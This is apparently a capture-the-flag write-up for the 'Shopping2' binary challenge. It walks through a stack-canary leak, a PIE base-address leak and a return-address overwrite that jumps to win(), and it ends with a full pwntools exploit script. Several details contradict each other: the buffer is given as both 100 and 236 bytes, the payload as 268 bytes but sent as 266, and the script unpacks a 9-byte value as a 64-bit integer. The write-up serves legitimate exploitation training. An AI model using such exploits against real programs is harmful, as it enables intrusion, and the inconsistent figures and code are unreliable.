# Shopping2

Author: `misi`

---
### Reversing
Start by doing a checksec on the given binary to see which security features are enabled.

<img width="582" height="137" alt="1" src="https://github.com/user-attachments/assets/0c643e60-0dfc-43fc-9221-fcb011ed0f2c" />

1. Stack canary is enabled
2. PIE is turned on
3. The binary is not stripped
4. NX is enabled

I will use ghidra to decompile the binary.

In this challenge there are 4 functions to focus on: main(), challenge(), menu(), and win().

<img width="679" height="410" alt="2" src="https://github.com/user-attachments/assets/94538c84-6ac8-49e5-95e9-839d5d3d0880" />

main() is not interesting as the only thing it does is call challenge().

<img width="599" height="844" alt="3" src="https://github.com/user-attachments/assets/e24db50e-5ece-452e-afe1-de20d08a22a9" />

menu() prints a list with 3 options, takes your input, and then returns to challenge():
1. Write to shopping list
2. Read from shopping list
3. Exit  

<img width="633" height="375" alt="4" src="https://github.com/user-attachments/assets/25df89e0-01a5-451d-9f90-9582cc0b65ef" />

<img width="679" height="598" alt="5" src="https://github.com/user-attachments/assets/6608e5dc-82ad-43a1-9da6-51a0e4645fd5" />

challenge() is being run in a while loop, that keeps calling menu. The option you choose in menu can lead to 3 different behaviours:  

1. If you choose the first option, the program will ask how many bytes you wish to write to the shopping list, and then it takes your input and reads it into a char buffer of size 100 bytes (local_84).
2. If your choose option 2, the program will print what is currently stored in the local_84 char buffer.
3. Option 3 will cause the program to return from challenge().

<img width="580" height="662" alt="6" src="https://github.com/user-attachments/assets/58560937-0350-417f-8d33-c21c0112404d" />

The win function will open the flag file and print it to stdout.

### Exploitation

Since the stack canary is enabled for this challenge, you cannot simply perform a buffer overflow on the local_84 char buffer, as the program will detect it if you overwrite the canary.  
To overcome this, you must first leak the stack canary, then overwrite it with its original value before finally overwriting the return address with the address of win().
Because PIE is enabled, it will not be possible to simply copy the win() address found in ghidra, as the binary's load address will be randomized at runtime.  
Therefore, you must also leak an address from the binary (e.g., an address in the .text section). From this leaked address, you can compute the base address of the elf by substracting its known offset. When you have the base address, you can calculate the address of any other function (such as win()) by adding its offset to the base.  

**Step 1: Leak the stack canary.**  
Based on ghidra, the shopping list buffer is 236 bytes. Below it on the stack are one size_t variable and one long variable, which is the stack canary.
The stack canary is stored just above the old base pointer, which is just above the return address. To reach and overwrite the stack canary, we must send in more than 236+8 = 244 bytes.    

The goal of this step is to leak the stack canary. To do this, we must send 245 bytes. Since the first byte of the canary is always a null byte, we need to overwrite it to be able to print it to stdout.  
So the actions to take are:
1. Choose option 1 from the menu.
2. Enter 245 as the number of bytes to send, and then send 245 bytes.
3. Choose option 2 from the menu.
4. The program will now print the 245 bytes that you sent, followed by the stack canary and possibly some other bytes until it encounter a null byte on the stack.  
5. Capture and record the leaked canary, prepend a nullbyte so it's ready to be used later.

**Step 2: Leak the return address.**  
The goal of this step is to leak any address belonging to the elf binary. If you see through the stack with gdb, you will see that the first viable address to leak is the return address. So that is what I will do in this writeup.  
To leak the return address, we must sent 236+24 = 260 bytes, we don't need an extra byte since the return address will not start with a null byte (can see this from ghidra).
So the actions to take are:
1. Choose option 1 from the menu.
2. Enter 260 as the number of bytes to send, and then send 260 bytes.
3. Choose option 2 from the menu.
4. The program will now print the 260 bytes that you sent, followed by the return address.  
5. Capture and record the leaked return address.
6. Find the offset to the leaked return address, there are many ways to do this. One way is to use gdb, start the binary, break at the challenge function, and find the return address on the stack. Use vmmap command to find the start address of the binary, and then substract the return address with the start address to find the offset between them.
7. Substract the leaked return address with the offset to get the base address of the binary
8. Find the offset to the win() address with the same method used in 6.
9. Add the win() address offset to the base address.

<img width="781" height="529" alt="7" src="https://github.com/user-attachments/assets/b5261fa4-2e5f-4888-a7ee-290bc1d53a5d" />
<img width="421" height="69" alt="8" src="https://github.com/user-attachments/assets/8629e529-02d5-487a-8fa5-01a4b9fc6f54" />


**Step 3: Overwrite the return address**
Now that we have leaked the stack canary, and found the address to win(), we can finally overwrite the return address.

We know that we need to send 260 bytes to reach the return address.  
Choose option 1 from the menu again, but this time send in 268 bytes, where the first 244 bytes can be anything, the next 8 bytes must be the leaked canary and the next 8 bytes can again be anything.  
The final 8 bytes should be the address of win().  

**Step 4: Get flag**
The final step of the exploit is to choose option 3 from the menu, let the program return from challenge() directly to win(), where it will execute and print the flag to stdout. 

This is the final solve script:
```py
from pwn import *

context.arch = 'amd64'
context.binary = "./shopping2"
context.terminal = ['tmux', 'splitw', '-h']


p = process("./shopping2")

p.recvuntil(b"(1-3): ")
p.sendline(b"1")

p.recvuntil(b"list: ")
p.send(b"249\n")

p.recvuntil(b"data:\n")
p.send(b"A"*245)

p.recvuntil(b"(1-3): ")
p.sendline(b"2")

p.recvuntil(b"list:\n")

buffer = p.recvline().strip()
canary = u64(b"\x00"+buffer[245:252])

p.recvuntil(b"(1-3): ")
p.sendline(b"1")

p.recvuntil(b"list: ")
p.send(b"260\n")
p.recvuntil(b"data:\n")
p.send(b"A"*260)

p.recvuntil(b"(1-3): ")
p.sendline(b"2")
p.recvuntil(b"list:\n")

ret_adr = p.recvline().strip()
ret = u64(ret_adr[260:267] + b"\x00\x00")

base_address = ret-5775
win = base_address + 4620

p.recvuntil(b"(1-3): ")
p.sendline(b"1")

p.recvuntil(b"list: ")
p.send(b"266\n")
p.recvuntil(b"data:\n")
p.send(b"A"*244+p64(canary)+b"A"*8+p64(win))

p.interactive()
```

